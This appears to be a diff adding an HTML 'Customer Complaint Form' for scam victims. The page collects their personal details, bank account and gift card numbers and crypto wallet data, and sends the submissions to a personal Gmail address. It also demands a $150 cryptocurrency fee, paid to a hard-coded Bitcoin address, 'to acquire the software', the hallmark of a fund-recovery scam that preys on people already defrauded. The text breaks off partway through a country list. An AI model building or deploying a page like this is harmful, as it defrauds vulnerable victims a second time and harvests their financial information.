@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Complaint Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* --- 1. Amazing Animated Background --- */
+        body {
+            background: linear-gradient(-45deg, #1a237e, #3f51b5, #009688, #283593);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        /* --- 2. Glassmorphism effect for the form container --- */
+        .form-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+
+        /* --- 3. Standard and New Animation Styles --- */
+        .input-error { border-color: #f87171; }
+        .complaint-type-btn { transition: all 0.2s ease-in-out; }
+        .complaint-type-btn.active { background-color: #3b82f6; color: white; border-color: #3b82f6; }
+        .hidden-dropdown { display: none; overflow: hidden; transition: max-height 0.5s ease-in-out, opacity 0.5s ease-in-out, margin-top 0.3s ease-in-out; max-height: 0; opacity: 0; }
+        .range-container.active .hidden-dropdown { display: block; max-height: 300px; opacity: 1; margin-top: 0.75rem; }
+        .form-section { opacity: 1; transform: translateX(0); transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out; }
+        .form-section:not(.active) { display: none; opacity: 0; transform: translateX(-30px); }
+        .form-section.is-exiting { display: block !important; opacity: 0; transform: translateX(30px); }
+        .form-section.is-exiting-back { display: block !important; opacity: 0; transform: translateX(-30px); }
+        input, textarea, select { transition: box-shadow 0.2s ease-in-out, border-color 0.2s ease-in-out; }
+        input:focus, textarea:focus, select:focus { box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3); border-color: #3b82f6 !important; }
+        button, .clickable-link { transition: all 0.2s ease-in-out; }
+        button:hover, .clickable-link:hover { transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); }
+        button:active, .clickable-link:active { transform: translateY(0); box-shadow: none; }
+        button:disabled { cursor: not-allowed; opacity: 0.7; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .error-message { color: #f87171; font-size: 0.875rem; margin-top: 0.25rem; animation: fadeInUp 0.3s ease-in-out; }
+        @keyframes pop { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .pop-animation { animation: pop 0.3s ease-out; }
+        .file-upload-zone:hover { border-color: #3b82f6; background-color: #f9fafb; }
+        .country-dropdown-list{display:none;position:absolute;background-color:white;border:1px solid #e2e8f0;border-radius:.5rem;width:100%;max-height:200px;overflow-y:auto;z-index:10;box-shadow:0 4px 6px rgba(0,0,0,.1)}.country-dropdown-list div{padding:.75rem 1rem;cursor:pointer}.country-dropdown-list div:hover{background-color:#f3f4f6}.phone-input-group{display:flex;align-items:center}.calling-code{background-color:#f3f4f6;border:1px solid #e2e8f0;padding:.5rem .75rem;border-right:none;border-radius:.5rem 0 0 .5rem;color:#4b5563}.phone-input-group input{border-radius:0 .5rem .5rem 0}
+        
+        /* --- Payment Modal Styles --- */
+        #payment-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(10, 20, 40, 0.8);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: center;
+            padding: 1rem;
+            z-index: 50;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            overflow-y: auto;
+            padding-top: 5vh;
+            padding-bottom: 5vh;
+        }
+        #payment-modal-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+        .crypto-payment-module {
+            background-color: rgba(255, 255, 255, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            padding: 40px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-sizing: border-box;
+            position: relative;
+            opacity: 0;
+            transform: scale(0.95) translateY(20px);
+            transition: opacity 0.4s ease-out, transform 0.4s ease-out;
+            margin: auto;
+        }
+        #payment-modal-overlay.visible .crypto-payment-module {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+        }
+        .crypto-payment-module .header h1, .crypto-payment-module .header p { color: #1a202c; }
+        .crypto-payment-module .header h1 { font-size: 28px; font-weight: 600; margin: 0; }
+        .crypto-payment-module .header p { font-size: 16px; margin-top: 8px; }
+        .crypto-payment-module .header { text-align: center; margin-bottom: 30px; }
+        .crypto-payment-module .crypto-selection { display: flex; justify-content: center; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
+        .crypto-payment-module .crypto-option { border: 2px solid #e2e8f0; border-radius: 12px; padding: 15px 20px; cursor: pointer; transition: all 0.2s ease-in-out; display: flex; align-items: center; gap: 10px; background-color: #fff; }
+        .crypto-payment-module .crypto-option:hover, .crypto-payment-module .crypto-option.active { border-color: #3f51b5; background-color: #f0f2ff; transform: translateY(-3px); }
+        .crypto-payment-module .crypto-option.active { box-shadow: 0 4px 20px rgba(63, 81, 181, 0.3); }
+        .crypto-payment-module .crypto-option img { width: 32px; height: 32px; }
+        .crypto-payment-module .crypto-option span { font-size: 18px; font-weight: 500; color: #2d3748; }
+        .crypto-payment-module .amount-display, .crypto-payment-module .exchange-rate, .crypto-payment-module .wallet-address-container, .crypto-payment-module .payment-info { color: #2d3748; }
+        .crypto-payment-module .amount-display { text-align: center; margin-bottom: 25px; }
+        .crypto-payment-module .amount-crypto { font-size: 32px; font-weight: 700; color: #1a237e; margin-bottom: 5px; }
+        .crypto-payment-module .amount-fiat { font-size: 18px; color: #718096; }
+        .crypto-payment-module .exchange-rate { font-size: 14px; color: #718096; text-align: center; margin-bottom: 25px; }
+        .crypto-payment-module .qr-code { display: flex; justify-content: center; margin-bottom: 25px; }
+        .crypto-payment-module .qr-code img { border-radius: 8px; padding: 8px; border: 1px solid #e2e8f0; background: white; }
+        .crypto-payment-module .wallet-address-container { text-align: center; }
+        .crypto-payment-module .wallet-address-container label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; }
+        .crypto-payment-module .wallet-address { background-color: #edf2f7; border: 1px solid #e2e8f0; border-radius: 6px; padding: 12px; font-size: 14px; word-wrap: break-word; display: flex; align-items: center; justify-content: space-between; }
+        .crypto-payment-module .copy-button { background: none; border: none; cursor: pointer; color: #3f51b5; font-weight: 600; font-size: 16px; padding-left: 10px; transition: all 0.2s; white-space: nowrap; }
+        .crypto-payment-module .copy-button:disabled { color: #009688; cursor: default; }
+        .crypto-payment-module .payment-info { font-size: 14px; text-align: center; margin-top: 25px; }
+        @media (max-width: 500px) {
+            .crypto-payment-module { padding: 30px 20px; }
+            .crypto-payment-module .wallet-address { flex-direction: column; gap: 12px; }
+            .crypto-payment-module .copy-button { width: 100%; padding: 12px 0; margin-top: 5px; border-radius: 6px; background-color: #e8eaf6; }
+            .crypto-payment-module .copy-button:hover { background-color: #dbe0ff; }
+            .crypto-payment-module .copy-button:disabled { background-color: #e0f2f1; }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-3xl rounded-xl shadow-2xl overflow-hidden form-container">
+        <!-- Form Header -->
+        <div class="bg-blue-600 p-6 text-white">
+            <div class="flex items-center justify-between">
+                <div>
+                    <h1 class="text-2xl font-bold">Customer Complaint Form</h1>
+                    <p class="text-blue-100">Your feedback helps us improve our services</p>
+                </div>
+                <div class="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+                </div>
+            </div>
+        </div>
+
+        <!-- Progress Steps -->
+        <div class="px-6 pt-4 pb-2">
+            <div class="flex justify-between items-center relative">
+                <div class="absolute top-1/2 left-0 w-full h-1 bg-gray-200 -z-10"></div>
+                <div id="progress-bar" class="absolute top-1/2 left-0 h-1 bg-blue-500 -z-10 transition-all duration-500 ease-in-out" style="width: 33.33%"></div>
+                <div class="step flex flex-col items-center relative"><div class="w-8 h-8 rounded-full bg-blue-500 text-white flex items-center justify-center font-bold">1</div><p class="text-xs mt-1 text-blue-600 font-medium">Personal Info</p></div>
+                <div class="step flex flex-col items-center"><div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-600">2</div><p class="text-xs mt-1 text-gray-500">Complaint Details</p></div>
+                <div class="step flex flex-col items-center"><div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-600">3</div><p class="text-xs mt-1 text-gray-500">Review & Submit</p></div>
+            </div>
+        </div>
+        
+        <!-- ============================================================================== -->
+        <!-- == IMPORTANT: REPLACE 'youremail@example.com' WITH YOUR REAL EMAIL ADDRESS == -->
+        <!-- ============================================================================== -->
+        <form id="complaintForm" class="p-6 space-y-6" action="https://formsubmit.co/Kyle441144@gmail.com" method="post" enctype="multipart/form-data">
+            <input type="hidden" name="_next" value="https://pcs1s.github.io/PrivateCybersecurityServices/"><input type="hidden" name="_subject" value="New Complaint Submitted!">
+
+            <!-- Section 1: Personal Information -->
+            <div class="form-section active" id="section1">
+                <h2 class="text-xl font-semibold mb-4 text-gray-800">Personal Information</h2>
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div><label for="firstName" class="block text-sm font-medium text-gray-700 mb-1">First Name*</label><input type="text" id="firstName" name="First Name" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80" required><div id="firstName-error" class="error-message"></div></div>
+                    <div><label for="lastName" class="block text-sm font-medium text-gray-700 mb-1">Last Name*</label><input type="text" id="lastName" name="Last Name" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80" required><div id="lastName-error" class="error-message"></div></div>
+                </div>
+                <div><label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email Address*</label><input type="email" id="email" name="Email" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80" required><div id="email-error" class="error-message"></div></div>
+                
+                <div>
+                    <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
+                    <div class="phone-input-group">
+                        <span id="calling-code" class="calling-code">+1</span>
+                        <input type="tel" id="phone" name="Phone" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80">
+                    </div>
+                    <div id="phone-error" class="error-message"></div>
+                </div>
+
+                <div><label for="age" class="block text-sm font-medium text-gray-700 mb-1">Age</label><input type="number" id="age" name="Age" min="18" max="120" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div>
+                
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="relative">
+                        <label for="countrySearch" class="block text-sm font-medium text-gray-700 mb-1">Country</label>
+                        <input type="text" id="countrySearch" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80" placeholder="Search for a country...">
+                        <input type="hidden" id="country" name="Country">
+                        <div id="countryDropdown" class="country-dropdown-list"></div>
+                    </div>
+                    <div><label for="state" class="block text-sm font-medium text-gray-700 mb-1">State/Province</label><input type="text" id="state" name="State" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div>
+                </div>
+                
+                <div><label for="city" class="block text-sm font-medium text-gray-700 mb-1">City</label><input type="text" id="city" name="City" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div>
+
+                <div class="grid md:grid-cols-3 gap-4">
+                    <div class="md:col-span-2"><label for="address" class="block text-sm font-medium text-gray-700 mb-1">Street Address</label><input type="text" id="address" name="Address" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div>
+                    <div><label for="zip" class="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label><input type="text" id="zip" name="ZIP Code" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div>
+                </div>
+                <div class="flex justify-end pt-4"><button type="button" onclick="nextSection(1, 2)" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">Next</button></div>
+            </div>
+
+            <!-- Section 2: Complaint Details -->
+            <div class="form-section" id="section2">
+                <h2 class="text-xl font-semibold mb-4 text-gray-800">Complaint Details</h2>
+                <div class="mb-6"><label for="complaintDate" class="block text-sm font-medium text-gray-700 mb-1">Date Filled*</label><input type="date" id="complaintDate" name="Date Filled" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80" required><div id="complaintDate-error" class="error-message"></div></div>
+                <div class="form-group mb-4"><label class="block text-sm font-medium text-gray-700 mb-2">Were you the one affected in this incident?</label><div class="flex gap-4"><div class="flex items-center"><input type="radio" id="affectedYes" name="Affected" value="yes" class="h-4 w-4 text-blue-600 border-gray-300"><label for="affectedYes" class="ml-2 block text-sm text-gray-900">Yes</label></div><div class="flex items-center"><input type="radio" id="affectedNo" name="Affected" value="no" checked class="h-4 w-4 text-blue-600 border-gray-300"><label for="affectedNo" class="ml-2 block text-sm text-gray-900">No</label></div></div></div>
+                <div class="form-group mb-6"><label class="block text-sm font-medium text-gray-700 mb-2">Did you contact your bank, financial institution, or Crypto Money Exchange?</label><div class="flex gap-4"><div class="flex items-center"><input type="radio" id="contactedBankYes" name="Contacted Bank" value="yes" class="h-4 w-4 text-blue-600 border-gray-300"><label for="contactedBankYes" class="ml-2 block text-sm text-gray-900">Yes</label></div><div class="flex items-center"><input type="radio" id="contactedBankNo" name="Contacted Bank" value="no" checked class="h-4 w-4 text-blue-600 border-gray-300"><label for="contactedBankNo" class="ml-2 block text-sm text-gray-900">No</label></div></div></div>
+                <div class="mb-6"><label class="block text-sm font-medium text-gray-700 mb-2">Fraud Type*</label><div class="grid grid-cols-2 md:grid-cols-3 gap-2"><button type="button" onclick="selectComplaintType(this, 'Crypto Scam')" class="complaint-type-btn px-4 py-2 border rounded-lg text-sm">Crypto Scam</button><button type="button" onclick="selectComplaintType(this, 'Dating and Romance Scam')" class="complaint-type-btn px-4 py-2 border rounded-lg text-sm">Dating and Romance Scam</button><button type="button" onclick="selectComplaintType(this, 'Investment Scam')" class="complaint-type-btn px-4 py-2 border rounded-lg text-sm">Investment Scam</button><button type="button" onclick="selectComplaintType(this, 'Identity Theft')" class="complaint-type-btn px-4 py-2 border rounded-lg text-sm">Identity Theft</button><button type="button" onclick="selectComplaintType(this, 'Hack or Phishing Link')" class="complaint-type-btn px-4 py-2 border rounded-lg text-sm">Hack or Phishing Link</button><button type="button" onclick="selectComplaintType(this, 'Other')" class="complaint-type-btn px-4 py-2 border rounded-lg text-sm">Other</button></div><input type="hidden" id="complaintType" name="Fraud Type" required><div id="complaintType-error" class="error-message"></div></div>
+                <div class="mb-6"><label for="TotalAmountLost" class="block text-sm font-medium text-gray-700 mb-1">Total Amount Lost (Exact Amount)</label><input type="number" id="TotalAmountLost" name="Total Amount Lost" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div>
+                <div class="mb-6"><label class="block text-sm font-medium text-gray-700 mb-2">Method of Loss</label><div class="grid grid-cols-2 md:grid-cols-4 gap-4" id="amount-range-container"><div class="range-container"><button type="button" onclick="toggleAmountRange(this, 'Crypto')" class="complaint-type-btn w-full text-center py-2 border rounded-lg text-sm">Crypto</button><div class="hidden-dropdown space-y-2"><input type="text" placeholder="Wallet Address" name="Crypto Wallet Address" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Transaction ID" name="Crypto Transaction ID" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Amount" name="Crypto Amount" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div></div><div class="range-container"><button type="button" onclick="toggleAmountRange(this, 'Bank Transfer')" class="complaint-type-btn w-full text-center py-2 border rounded-lg text-sm">Bank Transfer</button><div class="hidden-dropdown space-y-2"><input type="text" placeholder="Bank Name" name="Bank Name" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Account Number" name="Bank Account Number" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Amount" name="Bank Amount" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div></div><div class="range-container"><button type="button" onclick="toggleAmountRange(this, 'Gift Card')" class="complaint-type-btn w-full text-center py-2 border rounded-lg text-sm">Gift Card</button><div class="hidden-dropdown space-y-2"><input type="text" placeholder="Card Type (e.g., Amazon)" name="Gift Card Type" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Card Number" name="Gift Card Number" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Amount" name="Gift Card Amount" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div></div><div class="range-container"><button type="button" onclick="toggleAmountRange(this, 'P2P App')" class="complaint-type-btn w-full text-center py-2 border rounded-lg text-sm">P2P App</button><div class="hidden-dropdown space-y-2"><input type="text" placeholder="App (e.g. PayPal, CashApp)" name="P2P App Name" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Recipient Tag/Email" name="P2P Recipient" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"><input type="text" placeholder="Amount" name="P2P Amount" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80"></div></div></div><input type="hidden" id="methodOfLoss" name="Primary Method of Loss"></div>
+                <div class="mb-6"><label for="complaintDetails" class="block text-sm font-medium text-gray-700 mb-1">Complaint Details*</label><textarea id="complaintDetails" name="Complaint Details" rows="4" class="w-full px-4 py-2 border rounded-lg focus:ring-blue-500 focus:border-blue-500 bg-white/80" required placeholder="Please describe your complaint in detail..."></textarea><div id="complaintDetails-error" class="error-message"></div></div>
+                <div class="mb-6"><span class="block text-sm font-medium text-gray-700 mb-2">Upload Evidence for Complaint (e.g., screenshots, messages)</span><label for="complaint-file-upload" class="file-upload-zone mt-1 flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-lg bg-gray-50 cursor-pointer transition"><div class="space-y-1 text-center"><svg class="mx-auto h-12 w-12 text-gray-400" stroke="currentColor" fill="none" viewBox="0 0 48 48" aria-hidden="true"><path d="M28 8H12a4 4 0 00-4 4v20m32-12v8m0 0v8a4 4 0 01-4 4H12a4 4 0 01-4-4v-4m32-4l-3.172-3.172a4 4 0 00-5.656 0L28 28M8 32l9.172-9.172a4 4 0 015.656 0L28 28m0 0l4 4m4-24h8m-4-4v8m-12 4h.02" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><div class="flex text-sm text-gray-600"><p class="relative font-medium text-blue-600"><span>Upload files</span></p><p class="pl-1">or drag and drop</p></div><div id="complaint-file-list" class="mt-2 text-left text-xs text-gray-600 w-full"></div></div><input id="complaint-file-upload" name="Complaint Attachment" type="file" class="sr-only" multiple accept="image/*,video/*" onchange="handleFileUpload('complaint-file-upload', 'complaint-file-list')"></label></div>
+                <h2 class="text-xl font-semibold mb-2 text-gray-800">Form Payment Fee</h2><p class="text-sm text-gray-600 mb-4">Pay a fee of $150 in order to acquire the software.</p>
+                <div class="mb-4"><a href="#" onclick="openPaymentModal(); return false;" class="clickable-link w-full flex justify-center items-center gap-2 px-6 py-3 bg-green-500 text-white font-bold rounded-lg hover:bg-green-600 shadow-lg"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" /><path fill-rule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clip-rule="evenodd" /></svg>Click here to make Payments</a></div>
+                <div class="flex items-center mb-4"><input type="checkbox" id="paymentConfirmation" name="Payment Confirmed" value="YES" class="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" required><label for="paymentConfirmation" class="ml-2 block text-sm text-gray-700">I confirm that a payment was made for this service*</label></div><div id="paymentConfirmation-error" class="error-message mb-4"></div>
+                <div class="mb-6"><span class="block text-sm font-medium text-gray-700 mb-2">Upload Photos/Videos (must contain payment slip)*</span><label for="payment-file-upload" class="file-upload-zone mt-1 flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-lg bg-gray-50 cursor-pointer transition"><div class="space-y-1 text-center"><svg class="mx-auto h-12 w-12 text-gray-400" stroke="currentColor" fill="none" viewBox="0 0 48 48" aria-hidden="true"><path d="M28 8H12a4 4 0 00-4 4v20m32-12v8m0 0v8a4 4 0 01-4 4H12a4 4 0 01-4-4v-4m32-4l-3.172-3.172a4 4 0 00-5.656 0L28 28M8 32l9.172-9.172a4 4 0 015.656 0L28 28m0 0l4 4m4-24h8m-4-4v8m-12 4h.02" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><div class="flex text-sm text-gray-600"><p class="relative font-medium text-blue-600"><span>Upload files</span></p><p class="pl-1">or drag and drop</p></div><div id="payment-file-list" class="mt-2 text-left text-xs text-gray-600 w-full"></div></div><input id="payment-file-upload" name="Payment Attachment" type="file" class="sr-only" multiple accept="image/*,video/*" onchange="handleFileUpload('payment-file-upload', 'payment-file-list')"></label><div id="payment-file-upload-error" class="error-message"></div></div>
+                <div class="flex justify-between pt-2"><button type="button" onclick="prevSection(2, 1)" class="px-6 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300">Back</button><button type="button" onclick="nextSection(2, 3)" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">Next</button></div>
+            </div>
+
+            <!-- Section 3: Review & Submit -->
+            <div class="form-section" id="section3">
+                <h2 class="text-xl font-semibold mb-4 text-gray-800">Review Your Complaint</h2>
+                <div class="bg-gray-50 p-4 rounded-lg mb-6 space-y-4">
+                    <div><h3 class="font-medium text-gray-900 mb-2 border-b pb-2">Personal Information</h3>
+                        <div class="grid md:grid-cols-2 gap-x-4 gap-y-2 text-sm">
+                            <div><span class="text-gray-500">Name:</span> <strong id="review-name" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">Email:</span> <strong id="review-email" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">Phone:</span> <strong id="review-phone" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">Age:</span> <strong id="review-age" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">Country:</span> <strong id="review-country" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">State:</span> <strong id="review-state" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">City:</span> <strong id="review-city" class="text-gray-800"></strong></div>
+                            <div class="md:col-span-2"><span class="text-gray-500">Address:</span> <strong id="review-address" class="text-gray-800"></strong></div>
+                            <div><span class="text-gray-500">Zip Code:</span> <strong id="review-zip" class="text-gray-800"></strong></div>
+                        </div>
+                    </div>
+                    <div><h3 class="font-medium text-gray-900 mb-2 mt-4 border-b pb-2">Complaint Details</h3>
+                        <div id="review-complaint-details-dynamic" class="grid md:grid-cols-2 gap-x-4 gap-y-2 text-sm">
+                           <!-- Dynamic Content Rendered by JS -->
+                        </div>
+                    </div>
+                </div>
+                <div class="flex items-center mb-4"><input type="checkbox" id="confirm" name="Confirmation" value="YES" class="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" required><label for="confirm" class="ml-2 block text-sm text-gray-700">I confirm that the information provided is accurate to the best of my knowledge*</label></div><div id="confirm-error" class="error-message mb-4"></div>
+                <div class="flex justify-between pt-2"><button type="button" onclick="prevSection(3, 2)" class="px-6 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300">Back</button><button type="submit" id="submit-btn" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">Submit Complaint</button></div>
+            </div>
+        </form>
+    </div>
+
+    <!-- PAYMENT MODAL -->
+    <div id="payment-modal-overlay">
+        <div class="crypto-payment-module" id="payment-module" onclick="event.stopPropagation();">
+            <div class="header">
+                <h1>Pay with Cryptocurrency</h1>
+                <p>Select a currency and send the exact amount</p>
+            </div>
+            <div class="crypto-selection">
+                <div class="crypto-option active" onclick="selectCrypto(this, 'BTC')"><img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin"><span>Bitcoin</span></div>
+                <div class="crypto-option" onclick="selectCrypto(this, 'ETH')"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Ethereum_logo_2014.svg" alt="Ethereum"><span>Ethereum</span></div>
+                <div class="crypto-option" onclick="selectCrypto(this, 'LTC')"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e3/Litecoin_Logo.svg" alt="Litecoin"><span>Litecoin</span></div>
+            </div>
+            <div class="payment-details" id="payment-details">
+                <div class="amount-display">
+                    <div id="amount-crypto" class="amount-crypto">0.0013 BTC</div>
+                    <div id="amount-fiat" class="amount-fiat">~ $150.00 USD</div>
+                </div>
+                <div id="exchange-rate" class="exchange-rate">Rate: 1 BTC = $116,994.60 USD</div>
+                <div class="qr-code"><img id="qr-code-img" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bitcoin:bc1qyca4l5qtdznrpxj2mqedqfddnr0uqa946qa35l" alt="QR Code"></div>
+                <div class="wallet-address-container">
+                    <label for="wallet-address-text">Send to this address</label>
+                    <div class="wallet-address">
+                        <span id="wallet-address-text">bc1qyca4l5qtdznrpxj2mqedqfddnr0uqa946qa35l</span>
+                        <button type="button" id="copy-button" class="copy-button" onclick="copyCryptoAddress(this)">Copy</button>
+                    </div>
+                </div>
+            </div>
+            <p class="payment-info">This page will update after your payment is confirmed on the network.</p>
+            <div class="mt-6 text-center">
+                <button type="button" onclick="closePaymentModal()" class="px-6 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300">Close</button>
+            </div>
+        </div>
+    </div>
+
+
+    <select id="country-list-source" class="hidden">
+        <option value="">Select Country</option><option value="AF">Afghanistan</option><option value="AL">Albania</option><option value="DZ">Algeria</option><option value="AS">American Samoa</option><option value="AD">Andorra</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AQ">Antarctica</option><option value="AG">Antigua and Barbuda</option><option value="AR">Argentina</option><option value="AM">Armenia</option><option value="AW">Aruba</option><option value="AU">Australia</option><option value="AT">Austria</option><option value="AZ">Azerbaijan</option><option value="BS">Bahamas</option><option value="BH">Bahrain</option><option value="BD">Bangladesh</option><option value="BB">Barbados</option><option value="BY">Belarus</option><option value="BE">Belgium</option><option value="BZ">Belize</option><option value="BJ">Benin</option><option value="BM">Bermuda</option><option value="BT">Bhutan</option><option value="BO">Bolivia</option><option value="BA">Bosnia and Herzegovina</option><option value="BW">Botswana</option><option value="BR">Brazil</option><option value="IO">British Indian Ocean Territory</option><option value="BN">Brunei Darussalam</option><option value="BG">Bulgaria</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="KH">Cambodia</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="CV">Cape Verde</option><option value="KY">Cayman Islands</option><option value="CF">Central African Republic</option><option value="TD">Chad</option><option value="CL">Chile</option><option value="CN">China</option><option value="CX">Christmas Island</option><option value="CC">Cocos (Keeling) Islands</option><option value="CO">Colombia</option><option value="KM">Comoros</option><option value="CG">Congo</option><option value="CD">Congo, the Democratic Republic of the</option><option value="CK">Cook Islands</option><option value="CR">Costa Rica</option><option value="CI">Côte d'Ivoire</option><option value="HR">Croatia</option><option value="CU">Cuba</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option><option value="DJ">Djibouti</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option value="EC">Ecuador</option><option value="EG">Egypt</option><option value="SV">El Salvador</option><option value="GQ">Equatorial Guinea</option><option value="ER">Eritrea</option><option value="EE">Estonia</option><option value="ET">Ethiopia</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GA">Gabon</option><option value="GM">Gambia</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GH">Ghana</option><option value="GR">Greece</option><option value="GD">Grenada</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="GN">Guinea</option><option value="GW">Guinea-Bissau</option><option value="GY">Guyana</option><option value="HT">Haiti</option><option value="HN">Honduras</option><option value="HK">Hong Kong</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="ID">Indonesia</option><option value="IR">Iran</option><option value="IQ">Iraq</option><option value="IE">Ireland</option><option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="JO">Jordan</option><option value="KZ">Kazakhstan</option><option 